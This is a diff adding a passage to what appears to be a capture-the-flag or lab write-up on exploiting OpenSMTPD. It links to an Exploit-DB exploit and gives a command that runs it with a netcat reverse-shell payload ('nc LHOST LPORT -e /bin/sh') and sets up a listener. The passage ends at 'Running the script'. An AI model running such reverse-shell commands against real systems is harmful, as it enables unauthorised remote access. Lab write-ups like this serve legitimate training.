@@ -225,6 +225,28 @@ So the port is running ```OpenSMTPD```
 
 Checking for exploits, I found this
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b5a6dd0-1195-4281-a958-8c7c52662dfa)
+
+Download the exploit [here](https://www.exploit-db.com/exploits/47984) and send  it over to the target
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2870d7a-d517-4134-98b8-1b7297e9303c)
+
+To run the script
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0bc269a3-cced-4ee2-b2a5-98161ab618ab)
+
+Our command would look like this
+
+command:```python3 47984.py 127.0.0.1 'nc LHOST LPORT -e /bin/sh'```
+
+Ensure you edit the ```LHOST``` and ```LPORT```
+
+Setting a netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b9bb607-618b-4855-aac0-be78e95b871d)
+
+Running the script
+
 
 
 
